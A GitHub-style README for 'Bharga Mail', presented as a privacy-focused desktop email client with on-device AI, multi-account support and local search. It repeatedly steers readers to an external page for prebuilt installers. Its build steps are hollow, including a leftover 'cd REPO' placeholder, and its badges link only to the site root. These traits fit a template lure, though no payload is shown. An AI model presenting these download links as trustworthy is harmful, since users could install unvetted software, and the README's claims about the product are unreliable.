# Bharga Mail - Privacy-First Email Client 2026

> **Bharga Mail is a desktop email application for macOS, Windows, and Linux, bringing together local-first email workflows, on-device AI assistance, multi-account access, and privacy-focused inbox features.**

[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-AGPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tom-fosterac4645/bharga-mail-inbox-tools?style=flat-square)](https://github.com/tom-fosterac4645/bharga-mail-inbox-tools)

---

<p align="center">
  <a href="https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/">
    <img src="https://img.shields.io/badge/Download-Bharga%20Mail%20Latest-brightgreen?style=for-the-badge" alt="Download Bharga Mail">
  </a>
</p>

> **[Download Bharga Mail](https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/)**

---

[Download Latest Build](https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/)

---

## Overview

Bharga Mail provides a streamlined desktop inbox for users managing more than one email account. Alongside standard IMAP connections, it works with Gmail and Microsoft 365 and includes threaded conversations, rich-text messages, reusable signatures, scheduled delivery, and undo send.

Its local-first design combines SQLite-based search with AI processing performed on the device for inbox triage, message summaries, and help preparing drafts. Additional inbox review tools include SPF, DKIM, and DMARC indicators, dangerous-link detection, sandboxed HTML display, and operating-system keychain storage for credentials.

---

## Highlights

- Run inbox triage, generate message summaries, and prepare drafts with on-device AI
- Connect accounts through standard IMAP, Gmail, or Microsoft 365
- Keep related messages together with conversation threading
- View SPF, DKIM, and DMARC information as email trust indicators
- Identify phishing attempts and potentially dangerous links
- Schedule messages for later delivery or use undo send
- Write formatted messages and apply reusable signatures
- Search indexed mail locally through SQLite full-text search
- Protect account credentials with the operating system keychain
- Render email HTML inside a sandboxed environment
- Use the application on macOS, Windows, or Linux

---

## Getting Started

### Install a desktop release

Visit [Download Latest Build](https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/) and select the installer or package matching your operating system:

- macOS
- Windows
- Linux

Complete the usual installation steps for your platform. After opening Bharga Mail, add an email account to begin.

### Compile from source

```bash
git clone https://github.com/tom-fosterac4645/bharga-mail-inbox-tools.git
cd REPO
```

The desktop application is built with Tauri, Rust, and React. Set up the platform-specific development tools required by the project, then run the repository's documented development or packaging command to launch or package Bharga Mail.

---

## Typical Workflow

1. Start Bharga Mail.
2. Connect an IMAP, Gmail, or Microsoft 365 account.
3. Browse messages through the threaded inbox.
4. Search the configured accounts using local search.
5. Inspect trust indicators and link warnings while reading a message.
6. Apply on-device AI to triage mail, create summaries, or assist with a draft.
7. Write a response using rich text and signatures.
8. Send it immediately, schedule it, or use undo send when available.

---

## Data and Account Settings

Bharga Mail stores account credentials in the operating system keychain. The local SQLite database contains the data used for email search.

Account configuration is performed inside the desktop application. Depending on the provider, setup may require IMAP connection information or provider-specific authentication settings.

```text
Accounts       IMAP, Gmail, or Microsoft 365
Storage        Local SQLite search database
Credentials    Operating system keychain
AI processing  On-device triage, summaries, and drafts
```

---

## System Requirements

- macOS, Windows, or Linux
- An account from a supported IMAP service, Gmail, or Microsoft 365
- Network connectivity for synchronization and sending messages
- Adequate local storage for the application and indexed email
- Source builds require Rust, Node.js, and the Tauri prerequisites for the target operating system

---

## Frequently Asked Questions

### What providers can I connect?

Bharga Mail works with standard IMAP services, Gmail, and Microsoft 365.

### How does the application protect account credentials?

Credentials are saved through the keychain provided by the operating system.

### Is message search performed locally?

Yes. Bharga Mail maintains a local SQLite full-text search database to support fast email lookup.

### What does the on-device AI handle?

The AI features assist with inbox triage, message summaries, and draft preparation.

### How can I install an update?

Get the latest package from the [download page](https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/) and install the version intended for your operating system.

### What can I do when messages are missing?

First check the account credentials and provider configuration. Then confirm the account connection and network availability. If the problem continues, consult the project issue tracker or submit a support request containing relevant platform and account details.

### Are multiple accounts supported?

Yes. Bharga Mail is intended for use with multiple IMAP, Gmail, and Microsoft 365 accounts.

---

## Roadmap

Future plans and possible improvements are recorded in the repository's issues and project discussions. Review those resources for active priorities, progress updates, and ways to contribute.

---

## License

GNU Affero General Public License v3.0 - see [LICENSE](LICENSE) for details.
